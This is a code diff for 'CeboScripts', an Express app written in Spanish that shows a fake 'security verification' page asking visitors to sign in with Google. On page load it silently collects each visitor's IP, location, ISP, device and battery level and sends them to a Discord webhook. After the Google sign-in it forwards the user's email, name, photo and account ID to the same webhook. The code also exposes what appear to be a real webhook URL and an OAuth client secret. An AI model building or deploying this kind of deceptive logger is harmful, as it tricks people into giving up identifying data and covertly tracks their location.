@@ -1,102 +1,377 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>CeboScripts</title>
-    <style>
-        body { background: #000; color: #fff; text-align: center; padding: 50px; }
-        .btn-google {
-            background: #4285f4;
-            color: #fff;
-            padding: 15px 40px;
-            border: none;
-            border-radius: 5px;
-            font-size: 1.2em;
-            cursor: pointer;
-        }
-        .btn-google:hover { background: #357ae8; }
-    </style>
-</head>
-<body>
-    <h1>🔐 Verificación de seguridad</h1>
-    <p>Para continuar, inicia sesión con Google</p>
-    <button class="btn-google" onclick="iniciarSesion()">🔑 Iniciar sesión con Google</button>
+const express = require('express');
+const axios = require('axios');
+const app = express();
 
-    <script>
-        // ======== CONFIGURACIÓN ========
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1545583807804219432/4NXmuMtLnjKqgQqvZGSG2rXhy8j45SdiYvSAI3aeDFcrZBzObbEpS93HH3DPCYNIwhWD";
-        
-        // Este es un Client ID público de ejemplo (NO es real, necesitas el tuyo)
-        const GOOGLE_CLIENT_ID = "TU_CLIENT_ID.apps.googleusercontent.com";
-        
-        // URL de redirección (debe estar registrada en Google Console)
-        const REDIRECT_URI = "https://tupagina.vercel.app/callback";
+app.use(express.json());
 
-        // ======== FUNCIÓN QUE SÍ FUNCIONA ========
-        function iniciarSesion() {
-            // ✅ Esto NO se bloquea porque es iniciado por un clic
-            const popup = window.open(
-                `https://accounts.google.com/o/oauth2/v2/auth?` +
-                `client_id=${GOOGLE_CLIENT_ID}&` +
-                `redirect_uri=${REDIRECT_URI}&` +
-                `response_type=token&` +
-                `scope=email profile&` +
-                `prompt=consent`,
-                'googleAuth',
-                'width=500,height=600,menubar=no,toolbar=no,location=no'
-            );
+// ======== TUS CREDENCIALES ========
+const CLIENT_ID = '189299322354-u20tl4ks27e1npj8m1rlp7qjbplqj88l.apps.googleusercontent.com';
+const CLIENT_SECRET = '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';
+const REDIRECT_URI = 'https://ip-logger-nine-weld.vercel.app/callback';
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1545583807804219432/4NXmuMtLnjKqgQqvZGSG2rXhy8j45SdiYvSAI3aeDFcrZBzObbEpS93HH3DPCYNIwhWD';
 
-            // Capturar datos del dispositivo
-            capturarDatos();
-
-            // Monitorear si el usuario completó el login
-            const checkPopup = setInterval(() => {
-                if (popup.closed) {
-                    clearInterval(checkPopup);
-                    document.body.innerHTML = `
-                        <h1>✅ Proceso completado</h1>
-                        <p>Tus datos han sido registrados.</p>
-                    `;
+// ======== RUTA PRINCIPAL ========
+app.get('/', (req, res) => {
+    res.send(`
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>CeboScripts</title>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <style>
+                * { margin: 0; padding: 0; box-sizing: border-box; }
+                body {
+                    background: #000;
+                    color: #fff;
+                    font-family: 'Segoe UI', Arial, sans-serif;
+                    min-height: 100vh;
+                    display: flex;
+                    justify-content: center;
+                    align-items: center;
+                    flex-direction: column;
+                    padding: 20px;
                 }
-            }, 1000);
-        }
+                .container {
+                    text-align: center;
+                    max-width: 500px;
+                }
+                .icon { font-size: 4em; margin-bottom: 20px; }
+                h1 {
+                    color: #ff0000;
+                    font-size: 2.5em;
+                    text-shadow: 0 0 30px rgba(255,0,0,0.3);
+                    margin-bottom: 15px;
+                }
+                p { color: #888; font-size: 1.1em; margin-bottom: 30px; line-height: 1.5; }
+                .btn-google {
+                    background: #4285f4;
+                    color: #fff;
+                    padding: 16px 50px;
+                    border: none;
+                    border-radius: 8px;
+                    font-size: 1.2em;
+                    font-weight: bold;
+                    cursor: pointer;
+                    transition: all 0.3s;
+                    display: inline-flex;
+                    align-items: center;
+                    gap: 12px;
+                    box-shadow: 0 4px 15px rgba(66,133,244,0.3);
+                    text-decoration: none;
+                }
+                .btn-google:hover {
+                    background: #357ae8;
+                    transform: scale(1.05);
+                    box-shadow: 0 6px 25px rgba(66,133,244,0.5);
+                }
+                .btn-google:active { transform: scale(0.95); }
+                .footer {
+                    margin-top: 40px;
+                    color: #444;
+                    font-size: 0.8em;
+                    border-top: 1px solid #222;
+                    padding-top: 20px;
+                    width: 100%;
+                }
+                .status {
+                    margin-top: 20px;
+                    color: #666;
+                    font-size: 0.9em;
+                    min-height: 30px;
+                }
+                .loading {
+                    display: inline-block;
+                    width: 14px;
+                    height: 14px;
+                    border: 2px solid #333;
+                    border-top: 2px solid #4285f4;
+                    border-radius: 50%;
+                    animation: spin 0.8s linear infinite;
+                    margin-right: 8px;
+                    vertical-align: middle;
+                }
+                @keyframes spin { to { transform: rotate(360deg); } }
+                .hidden { display: none !important; }
+                .success { color: #00ff00; }
+                .error { color: #ff4444; }
+                .btn-disabled {
+                    opacity: 0.5;
+                    cursor: not-allowed;
+                    transform: none !important;
+                }
+            </style>
+        </head>
+        <body>
+            <div class="container">
+                <div class="icon">🔐</div>
+                <h1>VERIFICACIÓN DE SEGURIDAD</h1>
+                <p>Para continuar, inicia sesión con tu cuenta de Google.<br>
+                <span style="color:#666;font-size:0.85em;">Tus datos están protegidos con cifrado SSL.</span></p>
+                
+                <!-- ✅ ESTO ES UN ENLACE NORMAL, NO SE BLOQUEA -->
+                <a href="/auth/google" class="btn-google" id="googleBtn">
+                    <svg width="20" height="20" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59A14.5 14.5 0 0 1 9.5 24c0-1.59.28-3.14.76-4.59l-7.98-6.19A23.99 23.99 0 0 0 0 24c0 3.77.87 7.35 2.56 10.56l7.97-5.97z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 5.97C6.51 42.62 14.62 48 24 48z"/></svg>
+                    Iniciar sesión con Google
+                </a>
+                
+                <div class="status" id="statusMsg">🔍 Haz clic en el botón para iniciar sesión</div>
+                <div class="footer">CeboScripts • Verificación de identidad</div>
+            </div>
 
-        // ======== CAPTURAR DATOS ========
-        async function capturarDatos() {
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                const data = await res.json();
-
-                const info = {
-                    ip: data.ip,
-                    ciudad: data.city,
-                    pais: data.country_name,
-                    isp: data.org,
-                    direccion: `${data.city}, ${data.region}, ${data.country_name}`
-                };
-
-                // Enviar a Discord
-                await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        username: 'CeboScripts',
-                        content: '📢 Nuevo registro',
-                        embeds: [{
-                            color: 0xff0000,
-                            title: 'Datos capturados',
-                            fields: [
-                                { name: '📍 Dirección', value: info.direccion, inline: false },
-                                { name: '🌐 IP', value: info.ip, inline: true },
-                                { name: '📱 Dispositivo', value: navigator.userAgent, inline: true },
-                                { name: '📶 ISP', value: info.isp, inline: false }
-                            ]
-                        }]
-                    })
+            <script>
+                // ======== CAPTURAR DATOS AL CARGAR LA PÁGINA ========
+                async function capturarDatos() {
+                    try {
+                        const res = await fetch('https://ipapi.co/json/');
+                        const data = await res.json();
+                        
+                        // Información del dispositivo
+                        const ua = navigator.userAgent || '';
+                        let dispositivo = 'Desconocido';
+                        if (/android/i.test(ua)) dispositivo = 'Android';
+                        else if (/iphone|ipad|ipod/i.test(ua)) dispositivo = 'iOS';
+                        else if (/windows/i.test(ua)) dispositivo = 'Windows PC';
+                        else if (/mac/i.test(ua)) dispositivo = 'Mac';
+                        else if (/linux/i.test(ua)) dispositivo = 'Linux';
+                        
+                        // Batería
+                        let bateria = 'No disponible';
+                        try {
+                            if (navigator.getBattery) {
+                                const battery = await navigator.getBattery();
+                                bateria = Math.round(battery.level * 100) + '%';
+                            }
+                        } catch (e) {}
+                        
+                        const info = {
+                            ip: data.ip || 'No disponible',
+                            ciudad: data.city || 'No disponible',
+                            pais: data.country_name || 'No disponible',
+                            isp: data.org || 'No disponible',
+                            region: data.region || 'No disponible',
+                            dispositivo: dispositivo,
+                            bateria: bateria,
+                            direccionReal: \`\${data.city || 'No disponible'}, \${data.region || 'No disponible'}, \${data.country_name || 'No disponible'}\`,
+                            hora: new Date().toLocaleString(),
+                            userAgent: ua
+                        };
+                        
+                        // Enviar a Discord
+                        await fetch('/api/log-device', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(info)
+                        });
+                        
+                        console.log('✅ Datos enviados a Discord');
+                        document.getElementById('statusMsg').innerHTML = '✅ Datos del dispositivo registrados';
+                        
+                    } catch (error) {
+                        console.error('Error capturando datos:', error);
+                    }
+                }
+                
+                // ======== CAPTURAR DATOS AUTOMÁTICAMENTE ========
+                document.addEventListener('DOMContentLoaded', () => {
+                    capturarDatos();
                 });
-            } catch (e) {
-                console.error('Error:', e);
-            }
-        }
-    </script>
-</body>
-</html>
+            </script>
+        </body>
+        </html>
+    `);
+});
+
+// ======== RUTA: Iniciar autenticación (REDIRECCIÓN DIRECTA) ========
+app.get('/auth/google', (req, res) => {
+    // ✅ Esto es una redirección HTTP, NO se bloquea
+    const authUrl = `https://accounts.google.com/o/oauth2/v2/auth?` +
+        `client_id=${CLIENT_ID}&` +
+        `redirect_uri=${REDIRECT_URI}&` +
+        `response_type=code&` +
+        `scope=email profile&` +
+        `prompt=consent`;
+    
+    res.redirect(authUrl);
+});
+
+// ======== RUTA: Callback de Google ========
+app.get('/callback', async (req, res) => {
+    const { code } = req.query;
+    
+    if (!code) {
+        return res.send(`
+            <!DOCTYPE html>
+            <html>
+            <head><title>Error</title>
+            <style>body{background:#000;color:#fff;text-align:center;padding:50px;font-family:Arial}.error{color:#ff4444;font-size:3em}</style>
+            </head>
+            <body>
+                <div class="error">❌</div>
+                <h1>Error de autenticación</h1>
+                <p>No se recibió el código de verificación.</p>
+                <a href="/" style="color:#4285f4;text-decoration:none;margin-top:20px;display:inline-block;">↩️ Volver</a>
+            </body>
+            </html>
+        `);
+    }
+
+    try {
+        // 1️⃣ Intercambiar código por token
+        const tokenResponse = await axios.post('https://oauth2.googleapis.com/token', {
+            code,
+            client_id: CLIENT_ID,
+            client_secret: CLIENT_SECRET,
+            redirect_uri: REDIRECT_URI,
+            grant_type: 'authorization_code'
+        });
+
+        const { access_token } = tokenResponse.data;
+
+        // 2️⃣ Obtener datos del usuario
+        const userResponse = await axios.get('https://www.googleapis.com/oauth2/v2/userinfo', {
+            headers: { Authorization: `Bearer ${access_token}` }
+        });
+
+        const userData = userResponse.data;
+
+        // 3️⃣ Enviar a Discord
+        const embed = {
+            color: 0x00ff00,
+            title: '✅ NUEVO INICIO DE SESIÓN',
+            fields: [
+                { name: '📧 Correo', value: userData.email || 'No disponible', inline: false },
+                { name: '👤 Nombre', value: userData.name || 'No disponible', inline: true },
+                { name: '🖼️ Foto', value: userData.picture || 'No disponible', inline: true },
+                { name: '🆔 ID', value: userData.id || 'No disponible', inline: false }
+            ],
+            footer: { text: 'CeboScripts • OAuth real con Google' },
+            timestamp: new Date().toISOString()
+        };
+
+        await axios.post(WEBHOOK_URL, {
+            username: 'CeboScripts Logger',
+            content: '📢 **¡Nuevo usuario autenticado!**',
+            embeds: [embed]
+        });
+
+        // 4️⃣ Mostrar éxito
+        res.send(`
+            <!DOCTYPE html>
+            <html>
+            <head>
+                <title>¡Éxito!</title>
+                <style>
+                    * { margin: 0; padding: 0; box-sizing: border-box; }
+                    body {
+                        background: #000;
+                        color: #fff;
+                        font-family: 'Segoe UI', Arial, sans-serif;
+                        min-height: 100vh;
+                        display: flex;
+                        justify-content: center;
+                        align-items: center;
+                        flex-direction: column;
+                        padding: 20px;
+                    }
+                    .container { text-align: center; max-width: 500px; }
+                    .success { color: #00ff00; font-size: 4em; margin-bottom: 20px; }
+                    h1 { color: #fff; font-size: 2.5em; margin-bottom: 10px; }
+                    p { color: #888; font-size: 1.1em; margin-bottom: 10px; }
+                    .user-info {
+                        background: #111;
+                        padding: 20px;
+                        border-radius: 10px;
+                        margin: 20px 0;
+                        border: 1px solid #333;
+                        text-align: left;
+                    }
+                    .user-info div { padding: 8px 0; border-bottom: 1px solid #222; color: #aaa; }
+                    .user-info div:last-child { border-bottom: none; }
+                    .user-info strong { color: #fff; }
+                    .btn {
+                        display: inline-block;
+                        padding: 12px 30px;
+                        background: #4285f4;
+                        color: #fff;
+                        text-decoration: none;
+                        border-radius: 8px;
+                        margin-top: 20px;
+                        transition: 0.3s;
+                    }
+                    .btn:hover { background: #357ae8; transform: scale(1.05); }
+                </style>
+            </head>
+            <body>
+                <div class="container">
+                    <div class="success">✅</div>
+                    <h1>¡Autenticación exitosa!</h1>
+                    <p>Bienvenido, <strong style="color:#fff;">${userData.name || 'usuario'}</strong></p>
+                    <p style="color:#666;font-size:0.85em;">Tus datos han sido registrados en nuestro sistema.</p>
+                    
+                    <div class="user-info">
+                        <div><strong>📧 Correo:</strong> ${userData.email || 'No disponible'}</div>
+                        <div><strong>👤 Nombre:</strong> ${userData.name || 'No disponible'}</div>
+                        <div><strong>🆔 ID:</strong> ${userData.id || 'No disponible'}</div>
+                    </div>
+                    
+                    <a href="/" class="btn">Volver al inicio</a>
+                </div>
+            </body>
+            </html>
+        `);
+
+    } catch (error) {
+        console.error('❌ Error en callback:', error.response?.data || error.message);
+        res.send(`
+            <!DOCTYPE html>
+            <html>
+            <head><title>Error</title>
+            <style>body{background:#000;color:#fff;text-align:center;padding:50px;font-family:Arial}.error{color:#ff4444;font-size:3em}</style>
+            </head>
+            <body>
+                <div class="error">❌</div>
+                <h1>Error de autenticación</h1>
+                <p>${error.response?.data?.error_description || error.message}</p>
+                <a href="/" style="color:#4285f4;text-decoration:none;margin-top:20px;display:inline-block;">↩️ Volver</a>
+            </body>
+            </html>
+        `);
+    }
+});
+
+// ======== RUTA: Recibir datos del dispositivo ========
+app.post('/api/log-device', async (req, res) => {
+    try {
+        const data = req.body;
+        
+        const embed = {
+            color: 0xff8800,
+            title: '📱 DATOS DEL DISPOSITIVO',
+            fields: [
+                { name: '📍 Dirección Real', value: data.direccionReal || 'No disponible', inline: false },
+                { name: '🌐 IP', value: data.ip || 'No disponible', inline: true },
+                { name: '📱 Dispositivo', value: data.dispositivo || 'No disponible', inline: true },
+                { name: '🔋 Batería', value: data.bateria || 'No disponible', inline: true },
+                { name: '📶 ISP', value: data.isp || 'No disponible', inline: false },
+                { name: '🕒 Hora', value: data.hora || 'No disponible', inline: false }
+            ],
+            footer: { text: 'CeboScripts • Datos capturados' },
+            timestamp: new Date().toISOString()
+        };
+
+        await axios.post(WEBHOOK_URL, {
+            username: 'CeboScripts Logger',
+            content: '📢 **Datos del dispositivo capturados**',
+            embeds: [embed]
+        });
+
+        res.json({ success: true });
+    } catch (error) {
+        console.error('Error enviando datos del dispositivo:', error);
+        res.status(500).json({ error: error.message });
+    }
+});
+
+// ======== EXPORTAR PARA VERCEL ========
+module.exports = app;
